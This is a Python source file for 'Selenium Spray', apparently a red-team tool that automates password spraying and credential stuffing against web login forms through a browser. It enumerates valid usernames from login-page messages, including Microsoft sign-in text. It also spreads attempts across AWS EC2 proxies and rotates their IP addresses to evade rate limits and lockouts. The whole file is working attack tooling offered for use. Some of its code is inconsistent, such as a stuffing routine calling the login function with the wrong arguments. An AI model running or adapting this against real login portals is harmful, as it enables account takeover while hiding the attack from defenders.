import sys
from time import sleep
from selenium import webdriver
from selenium.webdriver import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.ui import WebDriverWait
from datetime import datetime, timedelta
from selenium.common.exceptions import TimeoutException
from concurrent.futures import ProcessPoolExecutor
import multiprocessing
import pause
from multiprocessing import Process
from selray.utils import SprayConfig, aws, utils

# --------------------------------- #
# GLOBAL VARIABLES                  #
# --------------------------------- #

__version__ = "0.4"


# --------------------------------- #
# CLASSES                           #
# --------------------------------- #

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# --------------------------------- #
# FUNCTIONS                         #
# --------------------------------- #

def credential_stuffing(usernames, url, fail, success, threads, delay, invalid_username, username_field_key,
                        username_field_value, password_field_key, password_field_value, checkbox_key, checkbox_value):
    credentials = []
    for credential in usernames:
        username = credential.split(":")[0]
        password = credential.split(":")[1]
        credentials.append({'USERNAME': username, 'PASSWORD': password, 'ATTEMPT': 0})

    # Assign unique spray identifier
    from collections import defaultdict
    user_groups = defaultdict(list)
    for d in credentials:
        user_groups[d['USERNAME']].append(d)
    for user, group in user_groups.items():  # Assigning sequential ATTEMPT values
        for index, d in enumerate(group, start=1):
            d['ATTEMPT'] = index
    credentials = [d for group in user_groups.values() for d in group]  # Flatten the list

    stuffing_attempt = 1
    num_stuffing_attempts = max(d['ATTEMPT'] for d in credentials)
    while stuffing_attempt <= num_stuffing_attempts:
        next_start_time = datetime.now() + timedelta(minutes=delay)  # Check when the next spray should run
        print(f"Beginning stuffing attempt {stuffing_attempt} of {num_stuffing_attempts}.")

        # Spin up processes for each login attempt. Threads could have also been utilized, but Selenium is cleaner with
        # individual processes.
        manager = multiprocessing.Manager()
        with ProcessPoolExecutor(max_workers=threads) as executor:
            for credential in credentials:
                if credential['ATTEMPT'] == stuffing_attempt:
                    processes = executor.submit(attempt_login,
                                                username=credential['USERNAME'],
                                                password=credential['PASSWORD'],
                                                url=url,
                                                username_field_key=username_field_key,
                                                username_field_value=username_field_value,
                                                password_field_key=password_field_key,
                                                password_field_value=password_field_value,
                                                checkbox_key=checkbox_key,
                                                checkbox_value=checkbox_value,
                                                fail=fail,
                                                success=success,
                                                invalid_username=invalid_username)
            processes.result()

        # Check to see if the process is at the end. If not, wait the specified time.
        if stuffing_attempt < num_stuffing_attempts:
            print(f"Stuffing attempt {stuffing_attempt} of {num_stuffing_attempts} complete. Waiting until "
                  f"{next_start_time.strftime('%H:%M')} to start next spray.")
            pause.until(next_start_time)
        else:
            print(f"Spray of password {stuffing_attempt} of {num_stuffing_attempts} complete. All passwords complete.")
        stuffing_attempt += 1


def print_beginning(usernames=None, passwords=None, domain="", domain_after=False, url="", invalid_username=None,
                    fail="", success="", threads=5, delay=30, username_field="", password_field=""):
    # Calculate length of spray
    total_minutes = len(passwords) * delay
    days = total_minutes // (24 * 60)
    hours = (total_minutes % (24 * 60)) // 60
    minutes = total_minutes % 60
    if days == 0:
        spray_duration = "{:02d}:{:02d}".format(hours, minutes)
    else:
        spray_duration = "{:02d} {:02d}:{:02d}".format(days, hours, minutes)

    print(f"{Colors.HEADER}{Colors.BOLD}Selenium Spray{Colors.END}")
    print(f"Author:  Luke Lauterbach (Sentinel Technologies)")
    print(f"Version: {__version__}\n")

    print(f"{'Username Count:':<28}{len(usernames)}")
    print(f"{'Password Count:':<28}{len(passwords)}")
    print(f"{'Total Login Attempts:':<28}{(len(usernames) * len(passwords))}")
    print(f"{'Approximate Spray Duration:':<28}{spray_duration}")
    print(f"{'URL:':<28}{url}")
    if domain and domain_after:
        print(f"{'Domain:':<28}@{domain}")
    elif domain and not domain_after:
        print(f"{'Domain:':<28}{domain}/")
    print(f"{'Username Field:':<28}{username_field}")
    print(f"{'Password Field:':<28}{password_field}")
    if success:
        print(f"{'Success Condition:':<28}{success}")
    elif fail:
        print(f"{'Failure Condition:':<28}{fail}")
    print(f"{'Invalid Username Condition:':<28}{invalid_username}")
    print(f"{'Threads:':<28}{threads}")
    print(f"{'Delay:':<28}{delay}\n")


def print_ending():
    global valid_credentials
    print(f"\nPassword spraying completed at {datetime.now().strftime('%m/%d/%Y %H:%M')}")
    print(f"Valid Credentials Found: {len(valid_credentials)}")
    if valid_credentials:
        print(f"\nValid Credentials:")
        print(f"------------------")
        for credential in valid_credentials:
            print(f"{credential['USERNAME']} - {credential['PASSWORD']}")


def import_txt_file(filename):
    data = []
    with open(filename, "r") as file:
        for line in file:
            data.append(line.rstrip())
    return data


def process_file(filename):
    if filename.endswith(".txt"):
        return import_txt_file(filename)
    elif filename.endswith(".csv"):
        print("ERROR - CSVs are currently not supported.")
        sys.exit()
    else:
        return [filename]  # If it isn't a file, just return the username.


def prepare_success_fail(success="", fail=""):
    if not success and not fail:
        print(f"{Colors.FAIL}ERROR - No success or failure condition provided with -s or -f. Only one needs to be "
              f"provided, but one does need to be provided.{Colors.END}")
        sys.exit()
    elif success:
        success = success.split(",")
        fail = []
    elif fail:
        fail = fail.split(",")
        success = []

    return fail, success


def prepare_usernames(usernames=None, domain="", domain_after=False):
    if not domain:
        return usernames

    i = 0
    while i < len(usernames):
        if "/" in usernames[i] or "@" in usernames[i]:  # If the domain is already in the username, ignore the domain
            i += 1
            continue

        if domain_after:
            usernames[i] = f"{usernames[i]}@{domain}"
        else:
            usernames[i] = f"{domain}/{usernames[i]}"

        i += 1

    return usernames


def prepare_url(url=""):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"https://{url}"  # TODO Check URL and allow http://, if that's all that's supported.

    return url


def prepare_fields(username_field="", password_field="", checkbox=""):
    username_field = username_field.replace("'", "").replace('"', "")  # Remove quotation marks
    password_field = password_field.replace("'", "").replace('"', "")  # Remove quotation marks

    username_field = username_field.split("=")
    username_field_key = username_field[0]
    username_field_value = username_field[1]

    password_field = password_field.split("=")
    password_field_key = password_field[0]
    password_field_value = password_field[1]

    if checkbox:
        checkbox = checkbox.replace("'", "").replace('"', "")  # Remove quotation marks
        checkbox = checkbox.split("=")
        checkbox_key = checkbox[0]
        checkbox_value = checkbox[1]
    else:
        checkbox_key, checkbox_value = "", ""

    return (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
            checkbox_value)


def prepare_invalid_username(invalid_username=None):
    final_list = ["couldn't find an account with that username", "this username may be incorrect"]
    if invalid_username:
        invalid_username = invalid_username.split(",")
        final_list.extend(invalid_username)
    return final_list


def list_in_string(string_to_check="", list_to_compare=None):
    if not list_to_compare:
        return False
    for comparison_string in list_to_compare:
        if comparison_string in string_to_check:
            return True
    return False


def attempt_login(spray_config, username, proxy):
    selenium_options = webdriver.ChromeOptions()
    selenium_options.add_argument('--ignore-certificate-errors')
    #selenium_options.add_argument("--headless")
    if proxy:
        selenium_options.add_argument(f'--proxy-server=http://{proxy}:8888')
    driver = webdriver.Chrome(options=selenium_options)
    driver.delete_all_cookies()
    driver.get(spray_config.url)

    # Wait until the username box loads
    try:
        WebDriverWait(driver, 5).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")))
    except:
        print(f"ERROR - Could not find the username field with key {spray_config.username_field_key} and value "
              f"{spray_config.username_field_value}")
        driver.close()
        return

    # Find the username box
    input_box = driver.find_element(By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")
    input_box.clear()  # Clear any existing text in the input box
    input_box.send_keys(username)

    # Try to find the password box. If it isn't on the current page, hit the ENTER key and wait for the Password
    # field to load.
    try:
        WebDriverWait(driver, 1).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
    except TimeoutException:
        input_box.send_keys(Keys.RETURN)
        sleep(1)  # Wait for the page to load
        if "Microsoft" and "Work or school account" in driver.page_source:
            work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
            work_box.click()
            sleep(1)

    if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.invalid_username):
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {username}")
        driver.close()
        return

    try:
        WebDriverWait(driver, 3).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
    except:
        print(f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value "
              f"'{spray_config.password_field_value}'")
        driver.close()
        return

    password_box = driver.find_element(By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")
    password_box.clear()
    password_box.send_keys(spray_config.password)
    # If there's a checkbox, click it.
    if spray_config.checkbox_key and spray_config.checkbox_value:
        try:
            checkbox = driver.find_element(By.XPATH, f"//input[@{spray_config.checkbox_key}='{spray_config.checkbox_value}']")
            checkbox.click()
        except:
            print(f"ERROR - Could not find the password field with key {spray_config.password_field_key} and value "
                  f"{spray_config.password_field_value}")

    password_box.send_keys(Keys.RETURN)

    # Check to see if the login was successful
    sleep(2)
    result = False
    for conditional_statement in (spray_config.fail + spray_config.success):
        if conditional_statement in driver.page_source:
            result = True

    if result and spray_config.success:
        result = "SUCCESS"
    elif not result and spray_config.fail:
        result = "SUCCESS"
    elif result and spray_config.fail:
        result = "INVALID"
    elif not result and spray_config.success:
        result = "INVALID"

    if result == "SUCCESS":
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {username} - "
              f"{spray_config.password}")
    else:
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {username} - {spray_config.password}")

    driver.quit()

def main():
    args = utils.parse_arguments()
    ec2 = aws.get_ec2_session(args.aws_region, args.aws_access_key, args.aws_secret_key, args.aws_session_token)
    if args.proxy_clean:
        utils.list_proxies(args, ec2)
    elif args.proxy_list:
        utils.list_proxies(args, ec2)

    # Prepare variables
    args.fail, args.success = prepare_success_fail(fail=args.fail, success=args.success)
    args.usernames = process_file(args.usernames)
    if args.passwords:
        args.passwords = process_file(args.passwords)
    else:
        args.passwords = []
    args.usernames = prepare_usernames(args.usernames, args.domain, args.domain_after)
    args.url = prepare_url(args.url)
    invalid_username = prepare_invalid_username(invalid_username=args.invalid_username)
    (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
     checkbox_value) = prepare_fields(args.username_field, args.password_field, checkbox=args.checkbox)
    print_beginning(usernames=args.usernames, passwords=args.passwords, domain=args.domain, domain_after=args.domain_after, url=args.url,
                    fail=args.fail, success=args.success, threads=args.threads, delay=args.delay, username_field=args.username_field,
                    password_field=args.password_field, invalid_username=invalid_username)

    if not args.passwords and ":" in args.usernames[1]:
        credential_stuffing(args.usernames, args.url, args.fail, args.success, args.threads, args.delay, invalid_username, username_field_key,
                            username_field_value, password_field_key, password_field_value, checkbox_key,
                            checkbox_value)
    ec2 = aws.get_ec2_session(args.aws_region, args.aws_access_key, args.aws_secret_key, args.aws_session_token)
    proxies = utils.prepare_proxies(ec2, args)

    spray_config = SprayConfig.SprayConfig(
        url=args.url,
        username_field_key=username_field_key,
        username_field_value=username_field_value,
        password_field_key=password_field_key,
        password_field_value=password_field_value,
        checkbox_key=checkbox_key,
        checkbox_value=checkbox_value,
        fail=args.fail,
        success=args.success,
        invalid_username=invalid_username,
        num_sprays_per_ip=args.num_sprays_per_ip,
        aws_region=args.aws_region,
        aws_access_key=args.aws_access_key,
        aws_secret_key=args.aws_secret_key,
        aws_session_token=args.aws_session_token
    )

    # Loop through passwords
    password_id = 0
    while password_id < len(args.passwords):
        spray_config.password = args.passwords[password_id]
        next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run

        print(f"Beginning spray with password '{args.passwords[password_id]}'")

        # Split users among proxies
        chunk_size = (len(args.usernames) + len(proxies) - 1) // len(proxies)
        user_chunks = [args.usernames[i:i + chunk_size] for i in range(0, len(args.usernames), chunk_size)]

        processes = []
        for proxy, user_chunk in zip(proxies, user_chunks):
            p = Process(target=perform_spray, args=(spray_config, user_chunk, proxy))
            p.start()
            processes.append(p)

        for p in processes:
            p.join()

        # Check to see if the process is at the end. If not, wait the specified time.
        password_id += 1
        if password_id < len(args.passwords):
            print(f"Spray of password '{args.passwords[(password_id - 1)]}' complete. Waiting until "
                  f"{next_start_time.strftime('%H:%M')} to start next spray.")
            pause.until(next_start_time)
        else:
            print(f"Spray of password '{args.passwords[password_id - 1]}' complete. All passwords complete.")

    utils.destroy_proxies(args, ec2)
    print_ending()


def perform_spray(spray_config, usernames, proxy):
    ec2 = aws.get_ec2_session(spray_config.aws_region, spray_config.aws_access_key, spray_config.aws_secret_key, spray_config.aws_session_token)
    spray_num_with_current_ip = 0
    if proxy['type'] == 'AWS':
        proxy['ip'] = aws.start_ec2_instance(ec2, proxy['id'])

    for user in usernames:
        if spray_num_with_current_ip >= spray_config.num_sprays_per_ip and proxy['type'] == 'AWS':
            proxy['ip'] = aws.refresh_instance_ip(ec2, proxy['id'])
            spray_num_with_current_ip = 0
        attempt_login(spray_config, user, proxy['ip'])
        spray_num_with_current_ip += 1

    if proxy['type'] == 'AWS':
        aws.stop_ec2_instance(ec2, proxy['id'])


# --------------------------------- #
# MAIN                              #
# --------------------------------- #

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nCtrl+C Detected")
        print_ending()
        exit()
